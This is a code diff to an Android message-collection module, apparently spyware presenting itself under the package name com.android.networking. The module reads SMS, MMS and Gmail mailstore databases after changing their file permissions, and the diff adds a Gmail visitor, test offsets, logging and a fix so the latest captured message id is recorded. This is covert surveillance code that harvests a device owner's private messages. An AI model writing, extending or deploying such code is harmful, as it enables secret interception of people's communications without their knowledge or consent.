@@ -37,6 +37,7 @@ import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerProcess;
 import com.android.networking.listener.ListenerSms;
 import com.android.networking.module.email.Email;
+import com.android.networking.module.email.GmailVisitor;
 import com.android.networking.module.message.Filter;
 import com.android.networking.module.message.Mms;
 import com.android.networking.module.message.MmsBrowser;
@@ -278,8 +279,8 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 				}
 			}
 		}
-		
-		if(smsEnabled){
+
+		if (smsEnabled) {
 			int mylastSMS = readHistoricSms(lastSMS);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (initSms): next lastSMS: " + mylastSMS);
@@ -292,7 +293,12 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	private void initMail() {
 		lastMail = storedMAIL.unserialize(new Hashtable<String, Integer>());
-
+		if(Cfg.ONE_MAIL){
+			lastMail.put("mailstore.proc.test@gmail.com.db", 3886);
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (initMail), read lastMail: " + lastMail);
+		}
 	}
 
 	private void initSms() {
@@ -310,7 +316,6 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			}
 		}
 
-		
 		/*
 		 * if (!storedSMS.isMarkup()) { int lastSMS = readHistoricSms();
 		 * storedSMS.createEmptyMarkup(); }
@@ -360,7 +365,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		}
 	}
 
-	void updateMarkupMail(String mailstore, int lastId, boolean serialize) {
+	public void updateMarkupMail(String mailstore, int lastId, boolean serialize) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (updateMarkupMail), mailStore: " + mailstore + " +lastId: " + lastId);
 		}
@@ -368,6 +373,9 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		lastMail.put(mailstore, lastId);
 		try {
 			if (serialize || (lastId % 10 == 0)) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (updateMarkupMail), write lastId: " + lastId);
+				}
 				storedMAIL.writeMarkupSerializable(lastMail);
 			}
 		} catch (IOException e) {
@@ -386,25 +394,24 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		Path.unprotect(parent.getParent());
 		Path.unprotect(parent.getAbsolutePath());
 		Path.unprotect(dir.getAbsolutePath());
-		
+
 		FilenameFilter filterdb = new FilenameFilter() {
 			public boolean accept(File directory, String fileName) {
 				// i_3=mailstore.
 				return fileName.endsWith(".db") && fileName.startsWith(Messages.getString("i_3"));
 			}
 		};
-		
+
 		FilenameFilter filterall = new FilenameFilter() {
 			public boolean accept(File directory, String fileName) {
 				// i_3=mailstore.
 				return fileName.startsWith(Messages.getString("i_3"));
 			}
 		};
-		
-		for(String file : dir.list(filterall)){
+
+		for (String file : dir.list(filterall)) {
 			Path.unprotect(dir + "/" + file, true);
 		}
-
 
 		String[] mailstores = dir.list(filterdb);
 		return mailstores;
@@ -440,7 +447,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 					int newLastId = helper.traverseRecords("messages", visitor);
 
 					if (newLastId > lastId) {
-						updateMarkupMail(mailstore, lastId, true);
+						updateMarkupMail(mailstore, newLastId, true);
 					}
 				}
 			} catch (Exception ex) {
